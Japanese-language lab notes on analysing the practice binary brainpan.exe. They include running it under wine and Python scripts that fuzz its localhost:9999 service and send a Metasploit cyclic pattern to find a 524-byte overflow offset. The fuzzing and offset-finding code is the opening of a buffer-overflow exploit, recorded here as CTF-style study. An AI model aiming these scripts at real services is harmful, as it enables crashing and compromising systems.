〇表層解析

・file type

![[brainpan.exeの調査 image.png]]

・strings

strings brainpan.exe

![[brainpan.exeの調査 image 1.png]]

〇動的解析

・実行エラー

![[brainpan.exeの調査 image 2.png]]

・wineのインストール

apt-get install wine32

![[brainpan.exeの調査 image 3.png]]

・設定の初期化

wine brainpan.exe

![[brainpan.exeの調査 image 4.png]]

・実行

wine brainpan.exe

![[brainpan.exeの調査 image 5.png]]

コネクションの待受けを確認

・別のターミナルからアクセス

nc localhost 9999

適当なパスワードを入力

![[brainpan.exeの調査 image 6.png]]

・待受け側で変化

![[brainpan.exeの調査 image 7.png]]

BOFの兆候

〇メモリの境界置探索

・pythonでファジングコード作成

cat test_fuzz.py

#!/usr/bin/python

import socket

buf = \["A"\]

counter = 100

while len(buf) \< 30:

buf.append('A'*counter)

counter = counter + 200

for string in buf :

print( "Fuzzing PASS with %s bytes" % len(string))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connect = s.connect(('localhost', 9999))

s.recv(1024)

s.send((string + '\r\n').encode())

s.close()

![[brainpan.exeの調査 image 8.png]]

※

このPythonスクリプトは、ローカルホストのポート9999に接続しているTCPソケットを介して文字列を送信することで、ファジング（Fuzzing）を行うための単純なスクリプトです。

具体的には、スクリプトは以下のようなことを行います：

1\. \`buf\`というリストを作成し、最初の要素に1バイトの文字列"A"を追加します。

2\. ループを実行し、バッファの長さが30未満になるまで、"A"を200バイトずつ追加していきます。

3\. \`buf\`の各要素に対して、その長さを表示し、ソケットを作成してローカルホストのポート9999に接続します。

4\. 接続が確立された後、文字列をサーバーに送信し、接続を閉じます。

このスクリプトは、\`buf\`リスト内の各文字列を使用して、ローカルホストのポート9999に接続し、そのプロトコルがどのように振る舞うかを調査することができます。通常、ファジングは、プロトコルの実装に対する耐久性テストやセキュリティ評価の一環として使用されます。

・実行

python test_fuzz.py

![[brainpan.exeの調査 image 9.png]]

待受け側

![[brainpan.exeの調査 image 10.png]]

502～702bytesの間でオーバーフローになる

・具体的に何byte目かを調査

文字列中の3bytes目が特定できれば、それが文字列中のどの部分化を一意に特定できるコードを作成

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 702

![[brainpan.exeの調査 image 11.png]]

・コードを流し込むスクリプトを作成し実行

vim test_702_bof.py

#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buf = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3'

try :

print( "sending evil buffer...")

s.connect(('localhost', 9999))

data = s.recv(1024)

s.send(buf.encode() + b'\r\n')

print("\nDone!")

except:

print("ocunt not connect to Brain!")

![[brainpan.exeの調査 image 12.png]]

・実行

python test_702_bof.py

![[brainpan.exeの調査 image 13.png]]

![[brainpan.exeの調査 image 14.png]]

アドレス0x35724134にアクセスしている時にエラーが発生している

・メモリサイズの調査

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134

![[brainpan.exeの調査 image 15.png]]

524bytesと判明